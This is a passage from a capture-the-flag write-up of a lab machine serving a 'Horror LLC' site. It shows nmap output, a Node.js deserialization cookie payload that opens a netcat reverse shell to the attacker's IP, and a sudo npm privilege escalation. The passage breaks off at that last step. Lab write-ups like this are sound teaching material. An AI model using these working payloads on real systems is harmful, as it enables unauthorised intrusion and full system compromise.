</span></span><span style=display:flex><span>Scanning 10.10.121.122 <span style=color:#f92672>(</span>10.10.121.122<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.121.122
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.121.122
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 19:41, 0.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Service scan at 19:41
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 10.10.121.122 <span style=color:#f92672>(</span>10.10.121.122<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 19:41, 15.27s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 10.10.121.122 (10.10.121.122)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 10.10.121.122 (10.10.121.122)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 19:41
</span></span><span style=display:flex><span>Completed Traceroute at 19:41, 0.07s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:41
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 10.10.121.122.
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 3.53s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.14s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.121.122 <span style=color:#f92672>(</span>10.10.121.122<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.069s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 12ðŸ†Ž13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>|_http-favicon: Unknown favicon MD5: 8FCEA7DE73B9ED47DE799DB3AE6363A8
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>|     Content-Type: text/html
</span></span><span style=display:flex><span>|     Date: Wed, <span style=color:#ae81ff>31</span> Aug <span style=color:#ae81ff>2022</span> 16:41:22 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;html&gt;&lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Horror LLC&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;style&gt;
</span></span><span style=display:flex><span>|     body <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background: linear-gradient<span style=color:#f92672>(</span>253deg, <span style=color:#75715e>#4a040d, #3b0b54, #3a343b);</span>
</span></span><span style=display:flex><span>|     background-size: 300% 300%;
</span></span><span style=display:flex><span>|     -webkit-animation: Background 10s ease infinite;
</span></span><span style=display:flex><span>|     -moz-animation: Background 10s ease infinite;
</span></span><span style=display:flex><span>|     animation: Background 10s ease infinite;
</span></span><span style=display:flex><span>|     @-webkit-keyframes Background <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     background-position: 100% 50%
</span></span><span style=display:flex><span>|     100% <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     @-moz-keyframes Background <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     background-position: 100% 50%
</span></span><span style=display:flex><span>|     100% <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     @keyframes Background <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     background-posi
</span></span><span style=display:flex><span>|   HTTPOptions: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>|     Content-Type: text/html
</span></span><span style=display:flex><span>|     Date: Wed, <span style=color:#ae81ff>31</span> Aug <span style=color:#ae81ff>2022</span> 16:41:23 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;html&gt;&lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Horror LLC&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;style&gt;
</span></span><span style=display:flex><span>|     body <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background: linear-gradient<span style=color:#f92672>(</span>253deg, <span style=color:#75715e>#4a040d, #3b0b54, #3a343b);</span>
</span></span><span style=display:flex><span>|     background-size: 300% 300%;
</span></span><span style=display:flex><span>|     -webkit-animation: Background 10s ease infinite;
</span></span><span style=display:flex><span>|     -moz-animation: Background 10s ease infinite;
</span></span><span style=display:flex><span>|     animation: Background 10s ease infinite;
</span></span><span style=display:flex><span>|     @-webkit-keyframes Background <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     background-position: 100% 50%
</span></span><span style=display:flex><span>|     100% <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     @-moz-keyframes Background <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     background-position: 100% 50%
</span></span><span style=display:flex><span>|     100% <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|     @keyframes Background <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>|     background-position: 0% 50%
</span></span><span style=display:flex><span>|_    background-posi
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style=display:flex><span>|_http-title: Horror LLC
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port80-TCP:V<span style=color:#f92672>=</span>7.92%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>8/31%Time<span style=color:#f92672>=</span>630F8F33%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>GetR
</span></span><span style=display:flex><span>SF:equest,E4B,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDat
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:e:\x20Wed,\x2031\x20Aug\x202022\x2016:41:22\x20GMT\r\nConnection:\x20cl
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ose\r\n\r\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;Horror\x20LLC&lt;/title&gt;\n&lt;style&gt;\n\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0body\x20{\n\x20\x20\x20\x20background:\x20linear-gradient\(253deg,\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20\x20\x20\x20background-size:\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0300%\x20300%;\n\x20\x20\x20\x20-webkit-animation:\x20Background\x2010s
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20ease\x20infinite;\n\x20\x20\x20\x20-moz-animation:\x20Background\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:010s\x20ease\x20infinite;\n\x20\x20\x20\x20animation:\x20Background\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:10s\x20ease\x20infinite;\n\x20\x20}\n\x20\x20\n\x20\x20@-webkit-keyfram
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:es\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:50%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x20100%\x2050%\n
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ackground-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\n\x20\x20@-moz-keyframes\x20Background\x20{\n\x20\x20\x20\x200%\x20{\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-po
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:sition:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyframes\x20Background\x20{\n\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20background-posi&#34;</span><span style=color:#f92672>)</span>%r<span style=color:#f92672>(</span>HTTPOptions,E4B,<span style=color:#e6db74>&#34;HTTP/1\.1\x20200\x20OK\r\nCo
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ntent-Type:\x20text/html\r\nDate:\x20Wed,\x2031\x20Aug\x202022\x2016:41
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF::23\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;Horror\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20LLC&lt;/title&gt;\n&lt;style&gt;\n\x20\x20body\x20{\n\x20\x20\x20\x20background:\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20linear-gradient\(253deg,\x20#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20background-size:\x20300%\x20300%;\n\x20\x20\x20\x20-webkit-
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\x20-
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:moz-animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20}\n\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0\x20\n\x20\x20@-webkit-keyframes\x20Background\x20{\n\x20\x20\x20\x200
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20backgr
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ound-position:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@-moz-keyframes\x20Background
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-posi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:tion:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20background-position:\x20100%\x2050%\n\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20background-positi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SFðŸ”›\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyf
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:rames\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-posi&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 3.1 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, AXIS 210A or <span style=color:#ae81ff>211</span> Network Camera <span style=color:#f92672>(</span>Linux 2.6.17<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.1 - 3.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.11 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.2 - 4.9 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.5 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Uptime guess: 24.723 days <span style=color:#f92672>(</span>since Sun Aug  <span style=color:#ae81ff>7</span> 02:20:54 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>255</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 80/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   69.85 ms 10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   68.05 ms 10.10.121.122 <span style=color:#f92672>(</span>10.10.121.122<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 23.71 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>75</span> <span style=color:#f92672>(</span>5.900KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>57</span> <span style=color:#f92672>(</span>4.656KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Navigate to port <code>80</code>, in the Email address field put <code>test@test.com</code>, open Burp Suite and Intercept the request. Then send it to Repeater.<br>The request should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>POST /?email<span style=color:#f92672>=</span>test@test.com HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.121.122
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:91.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/91.0
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Origin: http://10.10.121.122
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://10.10.121.122/
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>Click the <code>Send</code> button and notice the response:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Set-Cookie: session<span style=color:#f92672>=</span>eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ<span style=color:#f92672>==</span>; Max-Age<span style=color:#f92672>=</span>900000; HttpOnly, Secure
</span></span><span style=display:flex><span>Content-Type: text/html
</span></span><span style=display:flex><span>Date: Wed, <span style=color:#ae81ff>31</span> Aug <span style=color:#ae81ff>2022</span> 16:48:27 GMT
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>3559</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>In the <code>Set-Cookie</code> header if we decode the session value from base64 we identify a serialized object.</p><ul><li>Command: <code>echo -n "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==" | base64 -d</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ echo -n <span style=color:#e6db74>&#34;eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==&#34;</span> | base64 -d
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;email&#34;</span>:<span style=color:#e6db74>&#34;test@test.com&#34;</span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Go in <code>Decoder</code> in Burp Suite and craft a serialized object like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>{<span style=color:#e6db74>&#34;email&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;_$$ND_FUNC$$_function (){require(&#39;child_process&#39;).exec(\&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.200.50 443 &gt;/tmp/f\&#34;, function(error, stdout, stderr) { console.log(stdout) });}()&#34;</span>}
</span></span></code></pre></div><p>Click on <code>Encode as</code> and select <code>Base64</code> so the output should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
</span></span></code></pre></div><p>Next, go to <code>http://10.10.121.122</code>, refresh the page, Intercept the request, add a <code>Cookie</code> header with the base64 encoded value into the session.<br>The request should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GET / HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.121.122
</span></span><span style=display:flex><span>Cookie: session<span style=color:#f92672>=</span>eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:91.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/91.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>Open a netcat listener and click <code>Forward</code> and we get a reverse shell as <code>dylan</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.8.200.50<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.121.122<span style=color:#f92672>]</span> <span style=color:#ae81ff>53470</span>
</span></span><span style=display:flex><span>/bin/sh: 0: can<span style=color:#e6db74>&#39;t access tty; job control turned off
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$ python3 -c &#39;</span>import pty;pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span><span style=display:flex><span>dylan@jason:/opt/webapp$ whoami
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>dylan
</span></span><span style=display:flex><span>dylan@jason:/opt/webapp$
</span></span></code></pre></div><p>The server performed deserialization of the <code>Cookie</code> header so the reverse shell was executed. The payload used can be found in this great article: <a href=https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>, which is about <code>Node.js</code> deserialization as in our case.<br>We can also read the <code>user.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>dylan@jason:/opt/webapp$ cd /home/dylan
</span></span><span style=display:flex><span>cd /home/dylan
</span></span><span style=display:flex><span>dylan@jason:~$ cat user.txt
</span></span><span style=display:flex><span>cat user.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After executing the command: <code>sudo -l</code> we see that we can execute <code>npm</code> without being asked for root password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>dylan@jason:~$ sudo -l
</span></span><span style=display:flex><span>sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> dylan on jason:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User dylan may run the following commands on jason:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/npm *
</span></span></code></pre></div><p>A great exploit for this can be found on: <a href=https://gtfobins.github.io/gtfobins/npm/#sudo>https://gtfobins.github.io/gtfobins/npm/#sudo</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>dylan@jason:~$ TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -d<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>dylan@jason:~$ echo <span style=color:#e6db74>&#39;{&#34;scripts&#34;: {&#34;preinstall&#34;: &#34;/bin/sh&#34;}}&#39;</span> &gt; $TF/package.json
</span></span><span style=display:flex><span>dylan@jason:~$ sudo npm -C $TF --unsafe-perm i
</span></span><span style=display:flex><span>sudo npm -C $TF --unsafe-perm i
</span></span><span style=display:flex><span>
